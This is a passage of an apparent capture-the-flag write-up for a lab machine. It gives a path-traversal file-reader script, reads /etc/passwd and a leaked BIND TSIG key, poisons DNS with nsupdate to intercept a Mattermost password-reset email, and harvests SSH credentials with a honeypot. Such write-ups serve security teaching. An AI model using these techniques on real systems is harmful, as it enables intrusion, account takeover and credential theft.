+<img alt="image-20230509154124652" class="include_image" loading="lazy" src="/img/image-20230509154124652.png"/>
+</picture>
+<h4 id="script">Script</h4>
+<p>To enumerate the host, I’ll write a quick Python script to allow me to easily pull files and unzip them. I’ll walk through building the script in <a href="https://www.youtube.com/watch?v=2a4OJeSZ_N0">this video</a>:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/2a4OJeSZ_N0?si=EsSvRwae_4mcaz5K" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>The final code looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">zipfile</span>
+<span class="kn">from</span> <span class="n">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [full path of file]</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="n">fpath</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">outfile</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="k">else</span> <span class="bp">None</span>
+
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">http://snoopy.htb/download?file=....//....//....//....//....//</span><span class="si">{</span><span class="n">fpath</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">File not found: </span><span class="si">{</span><span class="n">fpath</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">()</span>
+
+<span class="k">with</span> <span class="n">zipfile</span><span class="p">.</span><span class="nc">ZipFile</span><span class="p">(</span><span class="nc">BytesIO</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">content</span><span class="p">))</span> <span class="k">as</span> <span class="n">zip_file</span><span class="p">:</span>
+    <span class="n">file_path_in_zip</span> <span class="o">=</span> <span class="n">zip_file</span><span class="p">.</span><span class="nf">namelist</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">with</span> <span class="n">zip_file</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">file_path_in_zip</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">contents</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">outfile</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="sh">'</span><span class="s">wb</span><span class="sh">'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">contents</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Results written to </span><span class="si">{</span><span class="n">outfile</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">contents</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
+</code></pre></div></div>
+<h4 id="general-filesystem-enumeration">General Filesystem Enumeration</h4>
+<p>According to the <code class="language-plaintext highlighter-rouge">passwd</code> file, the box has six users with shells set:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python read_file.py /etc/passwd | <span class="nb">grep </span>sh<span class="err">$</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+cbrown:x:1000:1000:Charlie Brown:/home/cbrown:/bin/bash
+sbrown:x:1001:1001:Sally Brown:/home/sbrown:/bin/bash
+lpelt:x:1003:1004::/home/lpelt:/bin/bash
+cschultz:x:1004:1005:Charles Schultz:/home/cschultz:/bin/bash
+vgray:x:1005:1006:Violet Gray:/home/vgray:/bin/bash
+</span></code></pre></div></div>
+<p>The website can be accessed with <code class="language-plaintext highlighter-rouge">/proc/self</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python read_file.py /proc/self/cwd/index.html
+<span class="go">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+
+&lt;head&gt;
+  &lt;meta charset="utf-8"&gt;
+  &lt;meta content="width=device-width, initial-scale=1.0" name="viewport"&gt;
+  ...[snip]...
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/download</code> doesn’t work, nor with <code class="language-plaintext highlighter-rouge">index.php</code>, but <code class="language-plaintext highlighter-rouge">/download.php</code> does:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python read_file.py /proc/self/cwd/download/
+<span class="go">File not found: /proc/self/cwd/download/
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>python read_file.py /proc/self/cwd/download/index.php
+<span class="go">File not found: /proc/self/cwd/download/index.php
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>python read_file.py /proc/self/cwd/download.php
+<span class="go">&lt;?php
+...[snip]...
+</span></code></pre></div></div>
+<p>The full file is:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'press_package/'</span><span class="p">;</span>
+<span class="nv">$archive</span> <span class="o">=</span> <span class="nb">tempnam</span><span class="p">(</span><span class="nb">sys_get_temp_dir</span><span class="p">(),</span> <span class="s1">'archive'</span><span class="p">);</span>
+<span class="nv">$zip</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ZipArchive</span><span class="p">();</span>
+<span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">open</span><span class="p">(</span><span class="nv">$archive</span><span class="p">,</span> <span class="nc">ZipArchive</span><span class="o">::</span><span class="no">CREATE</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\.\.\//'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+        <span class="nv">$filecontent</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="mf">.</span> <span class="nv">$content</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filecontent</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$filecontent</span> <span class="o">!==</span> <span class="s1">'.'</span> <span class="o">&amp;&amp;</span> <span class="nv">$filecontent</span> <span class="o">!==</span> <span class="s1">'..'</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$content</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\.\.\//'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$filecontent</span><span class="p">);</span>
+                <span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">addFile</span><span class="p">(</span><span class="nv">$filecontent</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$files</span> <span class="o">=</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s1">'.'</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!==</span> <span class="s1">'..'</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">addFile</span><span class="p">(</span><span class="nv">$dir</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
+                <span class="p">}</span>
+        <span class="p">}</span>       
+<span class="p">}</span>
+
+<span class="nv">$zip</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/zip'</span><span class="p">);</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Disposition: attachment; filename=press_release.zip"</span><span class="p">);</span>
+<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Length: '</span> <span class="mf">.</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$archive</span><span class="p">));</span>
+
+<span class="nb">readfile</span><span class="p">(</span><span class="nv">$archive</span><span class="p">);</span>
+<span class="nb">unlink</span><span class="p">(</span><span class="nv">$archive</span><span class="p">);</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>It can load a single file or the contents of the  <code class="language-plaintext highlighter-rouge">press_package</code> directory. Can also confirm that it’s using <code class="language-plaintext highlighter-rouge">file_get_content</code> rather than <code class="language-plaintext highlighter-rouge">include</code>, so no execution on this path (and it’s not an LFI, though many will call it that). Nothing else useful here.</p>
+<h4 id="bind-enumeration">Bind Enumeration</h4>
+<p>During enumeration the Bind DNS server is running. The main configuration file for Bind is <code class="language-plaintext highlighter-rouge">/etc/bind/named.conf</code>, which contains global configuration options, such as the location of zone files, logging options, and other server settings.</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// This is the primary configuration file for the BIND DNS server named.</span>
+<span class="c1">//</span>
+<span class="c1">// Please read /usr/share/doc/bind9/README.Debian.gz for information on the </span>
+<span class="c1">// structure of BIND configuration files in Debian, *BEFORE* you customize </span>
+<span class="c1">// this configuration file.</span>
+<span class="c1">//</span>
+<span class="c1">// If you are just adding zones, please do that in /etc/bind/named.conf.local</span>
+
+<span class="nx">include</span> <span class="dl">"</span><span class="s2">/etc/bind/named.conf.options</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">include</span> <span class="dl">"</span><span class="s2">/etc/bind/named.conf.local</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">include</span> <span class="dl">"</span><span class="s2">/etc/bind/named.conf.default-zones</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="nx">key</span> <span class="dl">"</span><span class="s2">rndc-key</span><span class="dl">"</span> <span class="p">{</span>
+    <span class="nx">algorithm</span> <span class="nx">hmac</span><span class="o">-</span><span class="nx">sha256</span><span class="p">;</span>
+    <span class="nx">secret</span> <span class="dl">"</span><span class="s2">BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=</span><span class="dl">"</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>The config includes a couple other files, and defines an <code class="language-plaintext highlighter-rouge">rndc-key</code>. That <code class="language-plaintext highlighter-rouge">rndc-key</code> is important, and I’ll come back to that.</p>
+<p><code class="language-plaintext highlighter-rouge">named.conf.options</code> is mostly comments, but it does have the <code class="language-plaintext highlighter-rouge">allow-transfer</code> setting that allows my enumeration <a href="#dns---tcpudp-53">above</a>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">options</span> <span class="p">{</span>
+        <span class="nx">directory</span> <span class="dl">"</span><span class="s2">/var/cache/bind</span><span class="dl">"</span><span class="p">;</span>
+
+        <span class="c1">// If there is a firewall between you and nameservers you want</span>
+        <span class="c1">// to talk to, you may need to fix the firewall to allow multiple</span>
+        <span class="c1">// ports to talk.  See http://www.kb.cert.org/vuls/id/800113</span>
+
+        <span class="c1">// If your ISP provided one or more IP addresses for stable </span>
+        <span class="c1">// nameservers, you probably want to use them as forwarders.  </span>
+        <span class="c1">// Uncomment the following block, and insert the addresses replacing </span>
+        <span class="c1">// the all-0's placeholder.</span>
+
+        <span class="c1">// forwarders {</span>
+        <span class="c1">//      0.0.0.0;</span>
+        <span class="c1">// };</span>
+
+        <span class="c1">//========================================================================</span>
+        <span class="c1">// If BIND logs error messages about the root key being expired,</span>
+        <span class="c1">// you will need to update your keys.  See https://www.isc.org/bind-keys</span>
+        <span class="c1">//========================================================================</span>
+        <span class="nx">dnssec</span><span class="o">-</span><span class="nx">validation</span> <span class="nx">no</span><span class="p">;</span>
+        <span class="nx">allow</span><span class="o">-</span><span class="nx">transfer</span> <span class="p">{</span><span class="mf">10.0</span><span class="p">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">8</span><span class="p">;};</span>
+
+        <span class="c1">//listen-on-v6 { any; };</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">named.conf.local</code> has more config:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//</span>
+<span class="c1">// Do any local configuration here</span>
+<span class="c1">//</span>
+
+<span class="c1">// Consider adding the 1918 zones here, if they are not used in your</span>
+<span class="c1">// organization</span>
+<span class="c1">//include "/etc/bind/zones.rfc1918";</span>
+
+<span class="nx">zone</span> <span class="dl">"</span><span class="s2">snoopy.htb</span><span class="dl">"</span> <span class="nx">IN</span> <span class="p">{</span>
+    <span class="nx">type</span> <span class="nx">master</span><span class="p">;</span>
+    <span class="nx">file</span> <span class="dl">"</span><span class="s2">/var/lib/bind/db.snoopy.htb</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nx">allow</span><span class="o">-</span><span class="nx">update</span> <span class="p">{</span> <span class="nx">key</span> <span class="dl">"</span><span class="s2">rndc-key</span><span class="dl">"</span><span class="p">;</span> <span class="p">};</span>
+    <span class="nx">allow</span><span class="o">-</span><span class="nx">transfer</span> <span class="p">{</span> <span class="mf">10.0</span><span class="p">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">8</span><span class="p">;</span> <span class="p">};</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>This also configures the <code class="language-plaintext highlighter-rouge">allow-transfer</code>. It also has an <code class="language-plaintext highlighter-rouge">allow-update</code> value, which says that anyone with the <code class="language-plaintext highlighter-rouge">rndc-key</code> can update!</p>
+<h3 id="access-to-mattermost">Access to Mattermost</h3>
+<h4 id="update-mailsnoopyhtb">Update mail.snoopy.htb</h4>
+<p>The Bind9 docs have a <a href="https://bind9.readthedocs.io/en/v9_16_22/advanced.html#tsig">section on TSIG</a>:</p>
+<blockquote>
+<p>TSIG (Transaction SIGnatures) is a mechanism for authenticating DNS messages, originally specified in <a href="https://datatracker.ietf.org/doc/html/rfc2845.html"><strong>RFC 2845</strong></a>. It allows DNS messages to be cryptographically signed using a shared secret. TSIG can be used in any DNS transaction, as a way to restrict access to certain server functions (e.g., recursive queries) to authorized clients when IP-based access control is insufficient or needs to be overridden, or as a way to ensure message authenticity when it is critical to the integrity of the server, such as with dynamic UPDATE messages or zone transfers from a primary to a secondary server.</p>
+</blockquote>
+<p>The docs calls out <code class="language-plaintext highlighter-rouge">nsupdate</code> as the tool to do dynamic DNS updates with TSIG.</p>
+<p>I’ll create a file with the steps I want to do, and another with the key:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>poison_dns.txt 
+<span class="go">server 10.10.11.212
+zone snoopy.htb
+update add mail.snoopy.htb 86400 IN A 10.10.14.6
+send
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cat </span>rndc.key 
+<span class="go">key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};
+</span></code></pre></div></div>
+<p>If I ask the DNS server for <code class="language-plaintext highlighter-rouge">mail.snoopy.htb</code> before making changes, it comes back empty. I’ll run <code class="language-plaintext highlighter-rouge">nsupdate</code> and then it shows my IP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>dig mail.snoopy.htb +noall +answer @10.10.11.212
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>nsupdate <span class="nt">-k</span> rndc.key poison_dns.txt
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>dig mail.snoopy.htb +noall +answer @10.10.11.212
+<span class="go">mail.snoopy.htb.        86400   IN      A       10.10.14.6
+</span></code></pre></div></div>
+<p>It seems this resets every two minutes, so I’ll need to work fast, or be ready to come back and update this again.</p>
+<h4 id="capture-email">Capture Email</h4>
+<p>With the DNS pointed at my host, I’ll run a simple Python SMTP server using the <code class="language-plaintext highlighter-rouge">aoismtpd</code> module. Just like the <code class="language-plaintext highlighter-rouge">http.server</code> module, it can be run from the command line to create a simple server like <code class="language-plaintext highlighter-rouge">python -m aiosmtpd -n -l 0.0.0.0:25</code>. <code class="language-plaintext highlighter-rouge">-n</code> tells it not to try to set the UID (which is important since I’m not running as root). <code class="language-plaintext highlighter-rouge">-l 0.0.0.0:25</code> tell it to listen on 25. I’ve got my Python configured with capabilities to allow for listening on low ports:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>getcap /usr/bin/python3.11
+<span class="go">/usr/bin/python3.11 cap_net_bind_service=ep
+</span></code></pre></div></div>
+<p>Alternatively, you could try to install this package as root.</p>
+<p>With that running, I’ll request the reset email:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python <span class="nt">-m</span> aiosmtpd <span class="nt">-n</span> <span class="nt">-l</span> 0.0.0.0:25                        
+<span class="go">---------- MESSAGE FOLLOWS ----------
+mail options: ['BODY=8BITMIME']
+
+MIME-Version: 1.0
+Precedence: bulk
+To: sbrown@snoopy.htb
+Auto-Submitted: auto-generated
+Subject: [Mattermost] Reset your password
+Content-Transfer-Encoding: 8bit
+Date: Tue, 09 May 2023 21:08:16 +0000
+Reply-To: "No-Reply" &lt;no-reply@snoopy.htb&gt;
+Message-ID: &lt;qt31833ar96e61h3-1683666496@mm.snoopy.htb&gt;
+From: "No-Reply" &lt;no-reply@snoopy.htb&gt;
+Content-Type: multipart/alternative;
+ boundary=52b4c5cd180f7c88b0201b7c0f2e0f8361ac6969fe40e5073a1d5de091cd
+X-Peer: ('10.10.11.212', 53380)
+
+--52b4c5cd180f7c88b0201b7c0f2e0f8361ac6969fe40e5073a1d5de091cd
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain; charset=UTF-8
+
+Reset Your Password
+Click the button below to reset your password. If you didn=E2=80=99t reques=
+t this, you can safely ignore this email.
+
+Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D9opkx=
+uomfaxkhtwoskxak9msk9fzefkfrpyiexne8g95s675tuj7quytttcmuown )
+
+The password reset link expires in 24 hours.
+
+Questions?
+Need help or have questions? Email us at support@snoopy.htb ( support@snoop=
+y.htb )
+...[snip]...
+</span></code></pre></div></div>
+<p>It has a password reset link.</p>
+<h4 id="reset-and-login">Reset and Login</h4>
+<p>I’ll grab the link above, <code class="language-plaintext highlighter-rouge">http://mm.snoopy.htb/reset_password_complete?token=3D9opkx=
+uomfaxkhtwoskxak9msk9fzefkfrpyiexne8g95s675tuj7quytttcmuown</code>. Visiting the link asks for a new password:</p>
+<picture>
+<source srcset="/img/image-20230509171438255.webp" type="image/webp"/>
+<img alt="image-20230509171438255" class="include_image" loading="lazy" src="/img/image-20230509171438255.png"/>
+</picture>
+<p>Trying to change it will fail:</p>
+<picture>
+<source srcset="/img/image-20230509172553956.webp" type="image/webp"/>
+<img alt="image-20230509172553956" class="include_image" loading="lazy" src="/img/image-20230509172553956.png"/>
+</picture>
+<p>The link has some extra encoding in it that’s handled by SMTP. <code class="language-plaintext highlighter-rouge">=</code> is used in SMTP to represent the end of a line. So <code class="language-plaintext highlighter-rouge">=3D</code> is the Quoted printable encoding that represents an actual equals sign.</p>
+<p><a href="https://www.webatic.com/quoted-printable-convertor">This site</a> will decode it for me:</p>
+<picture>
+<source srcset="/img/image-20230509172703249.webp" type="image/webp"/>
+<img alt="image-20230509172703249" class="include_image" loading="lazy" src="/img/image-20230509172703249.png"/>
+</picture>
+<p>Or I can just replace <code class="language-plaintext highlighter-rouge">=3D</code> with <code class="language-plaintext highlighter-rouge">=</code> and remove <code class="language-plaintext highlighter-rouge">=</code> without a <code class="language-plaintext highlighter-rouge">3D</code>.</p>
+<p>Now on submitting it redirects back to the login page with a message that the password was updated:</p>
+<picture>
+<source srcset="/img/image-20230509173047988.webp" type="image/webp"/>
+<img alt="image-20230509173047988" class="include_image" loading="lazy" src="/img/image-20230509173047988.png"/>
+</picture>
+<p>I’m able to log in.</p>
+<picture>
+<source srcset="/img/image-20230509173132945.webp" type="image/webp"/>
+<img alt="image-20230509173132945" class="include_image" loading="lazy" src="/img/image-20230509173132945.png"/>
+</picture>
+<h3 id="ssh">SSH</h3>
+<h4 id="mattermost-enumeration">Mattermost Enumeration</h4>
+<p>I’m already in two channels. Off-Topic is empty. There are two important things going on in Town Square. First, there are messages about server provisioning:</p>
+<picture>
+<source srcset="/img/image-20230509175430992.webp" type="image/webp"/>
+<img alt="image-20230509175430992" class="include_image" loading="lazy" src="/img/image-20230509175430992.png"/>
+</picture>
+<p>And then later cbrown comes back to it:</p>
+<picture>
+<source srcset="/img/image-20230509175520882.webp" type="image/webp"/>
+<img alt="image-20230509175520882" class="include_image" loading="lazy" src="/img/image-20230509175520882.png"/>
+</picture>
+<p>Between that, there’s a conversation about antivirus:</p>
+<picture>
+<source srcset="/img/image-20230509175549292.webp" type="image/webp"/>
+<img alt="image-20230509175549292" class="include_image" loading="lazy" src="/img/image-20230509175549292.png"/>
+</picture>
+<p>ClamAV is a Linux AV, and it’s running on their servers. This will be useful later.</p>
+<p>Finally, sbrown is working on a new module and wants cbrown’s help:</p>
+<picture>
+<source srcset="/img/image-20230509175824987.webp" type="image/webp"/>
+<img alt="image-20230509175824987" class="include_image" loading="lazy" src="/img/image-20230509175824987.png"/>
+</picture>
+<p>If I click on “Find channel” and search for “se”, it finds the Server Provisioning Channel:</p>
+<picture>
+<source srcset="/img/image-20230509175917765.webp" type="image/webp"/>
+<img alt="image-20230509175917765" class="include_image" loading="lazy" src="/img/image-20230509175917765.png"/>
+</picture>
+<p>I’ll join it, but it’s empty.</p>
+<h4 id="slash-commands">slash commands</h4>
+<p>Mattermost (like Slack and Discord) supposed slash commands. By starting a message with <code class="language-plaintext highlighter-rouge">/[command]</code>, it will take some action. For example, putting <code class="language-plaintext highlighter-rouge">/shrug</code> will print <code class="language-plaintext highlighter-rouge">¯\_(ツ)_/¯</code>. But there are more complicated actions as well.</p>
+<p>By typing <code class="language-plaintext highlighter-rouge">/</code> the prompt will pop up with all possible commands:</p>
+<picture>
+<source srcset="/img/image-20230509193113410.webp" type="image/webp"/>
+<img alt="image-20230509193113410" class="include_image" loading="lazy" src="/img/image-20230509193113410.png"/>
+</picture>
+<p>Most of these are default Mattermost commands, but <code class="language-plaintext highlighter-rouge">/server_provision</code> jumps out as different:</p>
+<picture>
+<source srcset="/img/image-20230509193211488.webp" type="image/webp"/>
+<img alt="image-20230509193211488" class="include_image" loading="lazy" src="/img/image-20230509193211488.png"/>
+</picture>
+<p>It doesn’t have a description. Sending it opens a dialog:</p>
+<picture>
+<source srcset="/img/image-20230509193301539.webp" type="image/webp"/>
+<img alt="image-20230509193301539" class="include_image" loading="lazy" src="/img/image-20230509193301539.png"/>
+</picture>
+<p>I’ll fill out the form. The Operating system has two options, but only one that isn’t marked “Disabled”:</p>
+<picture>
+<source srcset="/img/image-20230509193637230.webp" type="image/webp"/>
+<img alt="image-20230509193637230" class="include_image" loading="lazy" src="/img/image-20230509193637230.png"/>
+</picture>
+<p>I’ll put my IP, and start <code class="language-plaintext highlighter-rouge">nc</code> listening on 2222. On sending, there’s a connection:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 2222
+<span class="go">Listening on 0.0.0.0 2222
+Connection received on 10.10.11.212 55630
+SSH-2.0-paramiko_3.1.0
+</span></code></pre></div></div>
+<p>Once I kill that connection, I get a DM from cbrown:</p>
+<picture>
+<source srcset="/img/image-20230509174852965.webp" type="image/webp"/>
+<img alt="image-20230509174852965" class="include_image" loading="lazy" src="/img/image-20230509174852965.png"/>
+</picture>
+<p>It seems that cbrown is trying to SSH into the given server to do some provisioning!</p>
+<h4 id="ssh-honeypot">SSH HoneyPot</h4>
+<p>There are several perfectly good SSH honeypots out there. I found some interesting old Python2 servers, and decided to <a href="https://www.youtube.com/watch?v=HO1h57CiF98">make my own</a>:</p>
+<iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" height="315" src="https://www.youtube.com/embed/HO1h57CiF98?si=olzZi8c_lwB1eSKA" style="border: 0px;" title="YouTube video player" width="560"></iframe>
+<p>When I run my script, it will print the username / password on connecting:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python sshpot.py 
+<span class="go">Connection from 10.10.11.212: cbrown:sn00pedcr3dential!!!
+</span></code></pre></div></div>
+<h4 id="cowrie">Cowrie</h4>
+<p>Alternatively, I can also just use <a href="https://github.com/cowrie/cowrie">cowrie</a>, which has a Docker container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>docker run <span class="nt">-p</span> 2222:2222 cowrie/cowrie:latest
+<span class="go">/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:97: CryptographyDeprecationWarning: Blowfish has been deprecated
+  b"blowfish-cbc": (algorithms.Blowfish, 16, modes.CBC),
+/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:101: CryptographyDeprecationWarning: CAST5 has been deprecated
+  b"cast128-cbc": (algorithms.CAST5, 16, modes.CBC),
+/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:106: CryptographyDeprecationWarning: Blowfish has been deprecated
+  b"blowfish-ctr": (algorithms.Blowfish, 16, modes.CTR),
+/cowrie/cowrie-env/lib/python3.9/site-packages/twisted/conch/ssh/transport.py:107: CryptographyDeprecationWarning: CAST5 has been deprecated
+  b"cast128-ctr": (algorithms.CAST5, 16, modes.CTR),
+2023-05-10T01:53:47+0000 [-] Python Version 3.9.2 (default, Feb 28 2021, 17:03:44) [GCC 10.2.1 20210110]
+2023-05-10T01:53:47+0000 [-] Twisted Version 22.10.0
+2023-05-10T01:53:47+0000 [-] Cowrie Version 2.5.0
+2023-05-10T01:53:47+0000 [-] Loaded output engine: jsonlog
+2023-05-10T01:53:47+0000 [twisted.scripts._twistd_unix.UnixAppLogger#info] twistd 22.10.0 (/cowrie/cowrie-env/bin/python3 3.9.2) starting up.
+2023-05-10T01:53:47+0000 [twisted.scripts._twistd_unix.UnixAppLogger#info] reactor class: twisted.internet.epollreactor.EPollReactor.
+2023-05-10T01:53:47+0000 [-] CowrieSSHFactory starting on 2222
+2023-05-10T01:53:47+0000 [cowrie.ssh.factory.CowrieSSHFactory#info] Starting factory &lt;cowrie.ssh.factory.CowrieSSHFactory object at 0x7ffa25561fa0&gt;
+2023-05-10T01:53:47+0000 [-] Ready to accept SSH connections
+</span></code></pre></div></div>
+<p>Now when I submit the provisioning form, there’s a bunch more logs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha1
+2023-05-10T01:54:26+0000 [cowrie.ssh.factory.CowrieSSHFactory] No moduli, no diffie-hellman-group-exchange-sha256
